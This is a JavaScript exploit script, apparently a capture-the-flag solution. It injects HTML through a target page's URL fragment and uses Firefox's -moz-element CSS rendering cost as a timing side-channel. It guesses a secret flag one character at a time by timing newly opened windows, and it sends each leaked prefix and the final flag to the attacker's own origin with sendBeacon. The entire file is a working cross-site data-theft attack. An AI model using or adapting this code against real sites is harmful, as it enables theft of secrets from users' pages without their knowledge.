const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
const KNOWN = new URLSearchParams(location.search).get("known");
const CHARS = "}_abcdefghijklmnopqrstuvwxyz";

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const wait = (win) =>
  new Promise(async (resolve) => {
    while (true) {
      try {
        win.document;
      } catch {
        resolve();
        break;
      }
      await sleep(5);
    }
  });

const measure = async (prefix) => {
  const hex = [...prefix]
    .map((c) => "\\" + c.charCodeAt(0).toString(16).padStart(2, "0"))
    .join("");
  const url = `${BASE_URL}#${encodeURIComponent(
    `<div style="background-image: -moz-element(#${hex}); height: 1000px; transform: scale(200) translate(50%, 0%); filter: drop-shadow(36px 36px 36px blue);"></div>`
  )}`;

  const ws = [];

  ws.push(open(url));
  await Promise.all(ws.map((w) => wait(w)));
  await sleep(100);

  let start = performance.now();
  for (let i = 0; i < 3; i++) {
    ws.push(open(BASE_URL));
  }
  await Promise.all(ws.map((w) => wait(w)));
  const end = performance.now();

  for (const w of ws) {
    w.close();
  }
  return end - start;
};

const getThreshold = async () => {
  const t = await measure("@");
  await sleep(50);
  return t * 3;
};

const leak = async (known) => {
  const TRY_NUM = 2;

  while (true) {
    let threshold = await getThreshold();
    console.log({ threshold });

    for (const c of CHARS) {
      for (let i = 0; i < TRY_NUM; i++) {
        const t = await measure(known + c);
        console.log({ c, t });
        navigator.sendBeacon(
          `${location.origin}/debug`,
          JSON.stringify({ known, c, t })
        );

        if (t < threshold) break;
        if (i === TRY_NUM - 1) return c;

        await sleep(2000);
        threshold = await getThreshold();
      }
    }
  }
};

const main = async () => {
  let known = KNOWN;
  while (!known.endsWith("}")) {
    known += await leak(known);
    console.log(known);
    navigator.sendBeacon(`${location.origin}/leaked`, known);
    await sleep(2000);
  }
  navigator.sendBeacon(`${location.origin}/flag`, known);
};
main();
